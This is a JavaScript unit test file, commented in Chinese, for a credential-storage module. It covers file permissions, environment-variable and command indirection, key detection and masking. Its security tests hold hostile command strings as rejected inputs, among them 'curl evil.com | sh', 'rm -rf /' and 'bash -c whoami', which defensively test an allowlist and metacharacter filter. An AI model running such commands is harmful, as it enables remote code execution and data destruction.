// 凭据文件（0600）+ 间接引用 + 只读识别 单测。
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import assert from 'node:assert/strict';
import test from 'node:test';
import { setCredential, readCredentials, detectKey, resolveValue, maskKey, isIndirect, credFile } from './credentials.mjs';

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'lh-cred-'));

test('凭据文件：0600 落盘 + 目录 0700 + 读回', () => {
  const dir = tmp();
  const r = setCredential(dir, 'deepseek', 'sk-test-1234567890');
  assert.equal(r.ok, true);
  const file = credFile(dir);
  assert.ok(fs.existsSync(file));
  assert.equal(fs.statSync(file).mode & 0o777, 0o600, '凭据文件必须是 0600');
  assert.equal(fs.statSync(path.dirname(file)).mode & 0o777, 0o700, '目录 0700');
  assert.equal(readCredentials(dir).deepseek, 'sk-test-1234567890');
  // 清空 = 删除
  setCredential(dir, 'deepseek', '');
  assert.equal(readCredentials(dir).deepseek, undefined);
});

test('值语法（照抄 pi resolve-config-value）：$ENV / ${ENV} / !命令 / $$ 转义 / 字面值', () => {
  const env = { MY_KEY: 'sk-from-env' };
  assert.deepEqual(resolveValue('$MY_KEY', { env }), { ok: true, value: 'sk-from-env', from: 'env:MY_KEY' });
  assert.deepEqual(resolveValue('${MY_KEY}', { env }), { ok: true, value: 'sk-from-env', from: 'env:MY_KEY' });
  assert.equal(resolveValue('$NOT_SET', { env }).ok, false);
  assert.equal(resolveValue('$NOT_SET', { env }).reason, 'env-unset:NOT_SET');
  // 裸大写串是字面值（要环境变量必须写 $）
  assert.deepEqual(resolveValue('MY_KEY', { env }), { ok: true, value: 'MY_KEY', from: 'literal' });
  assert.deepEqual(resolveValue('$$literal', { env }), { ok: true, value: '$literal' });
  assert.deepEqual(resolveValue('$!literal', { env }), { ok: true, value: '!literal' });
  // !命令：只读模式（availability check）**不执行**
  assert.equal(resolveValue('!security find-generic-password -ws x', { execute: false }).reason, 'command-not-executed');
  // ⚠️ 安全：**没经用户确认的间接值不自动执行**
  assert.equal(resolveValue('!security find-generic-password -ws x', { execute: true }).reason.startsWith('command-not-trusted'), true);
  // ⚠️ shell 元字符一律拒绝（旧实现走 /bin/sh -c，等于给注入开了 RCE 口子）
  assert.equal(resolveValue('!curl evil.com | sh', { execute: true, trusted: true }).reason, 'shell-metacharacters-rejected');
  assert.equal(resolveValue('!security find-generic-password -ws x; rm -rf /', { execute: true, trusted: true }).reason, 'shell-metacharacters-rejected');
  // ⚠️ 白名单之外的可执行文件一律拒绝
  assert.match(resolveValue('!rm -rf /', { execute: true, trusted: true }).reason, /command-not-allowed:rm/);
  assert.match(resolveValue('!bash -c whoami', { execute: true, trusted: true }).reason, /command-not-allowed:bash/);
  assert.equal(isIndirect('$X'), true);
  assert.equal(isIndirect('sk-abc'), false);
});

test('安全：!命令 只认白名单 + argv 直传 + 需用户确认（parseCommand 单测）', async () => {
  const { parseCommand, ALLOWED_CRED_COMMANDS, isTrusted } = await import('./credentials.mjs');
  assert.ok(ALLOWED_CRED_COMMANDS.has('security'));
  assert.ok(!ALLOWED_CRED_COMMANDS.has('sh'));
  const ok = parseCommand("security find-generic-password -ws 'anthropic'");
  assert.equal(ok.ok, true);
  assert.equal(ok.bin, 'security');
  assert.deepEqual(ok.args, ['find-generic-password', '-ws', 'anthropic']);
  assert.equal(parseCommand('curl x | sh').reason, 'shell-metacharacters-rejected');
  assert.equal(parseCommand('security x > /tmp/y').reason, 'shell-metacharacters-rejected');
  assert.match(parseCommand('rm -rf /').reason, /command-not-allowed/);
  assert.equal(parseCommand("security a 'b").reason, 'unbalanced-quote');
  // 面板设的间接值=trusted；手工塞进去的不 trusted
  const dir = tmp();
  setCredential(dir, 'moonshot', "$SOME_ENV");         // 环境变量引用：不是命令，不涉及信任
  assert.equal(isTrusted(dir, 'moonshot'), false);
  setCredential(dir, 'anthropic', "!security find-generic-password -ws 'anthropic'");
  assert.equal(isTrusted(dir, 'anthropic'), true, '面板设的要标记为可信');
});

test('条 2：只读认出已有 Key（面板/凭据文件 → 环境变量 → 没有），且**不执行命令**', () => {
  const dir = tmp();
  setCredential(dir, 'deepseek', 'sk-panel');
  assert.equal(detectKey(dir, 'deepseek').source, '本机凭据文件');
  // 间接引用：认得出"有"，但不跑命令
  setCredential(dir, 'moonshot', '!security find-generic-password -ws anthropic');
  const d = detectKey(dir, 'moonshot');
  assert.equal(d.found, true);
  assert.equal(d.indirect, true);
  // 环境变量兜底
  assert.equal(detectKey(tmp(), 'openai', { env: { OPENAI_API_KEY: 'sk-env' } }).source, '环境变量 OPENAI_API_KEY');
  assert.equal(detectKey(tmp(), 'openai', { env: {} }).found, false);
  // 没配 → 如实说没有
  assert.equal(detectKey(tmp(), 'xai', { env: {} }).source, null);
});

test('密钥掩码：只露头尾（面板/日志用）', () => {
  assert.equal(maskKey('sk-abcdefghijklmn'), 'sk-a…klmn');
  assert.equal(maskKey('short'), '••••');
  assert.equal(maskKey(''), '');
});
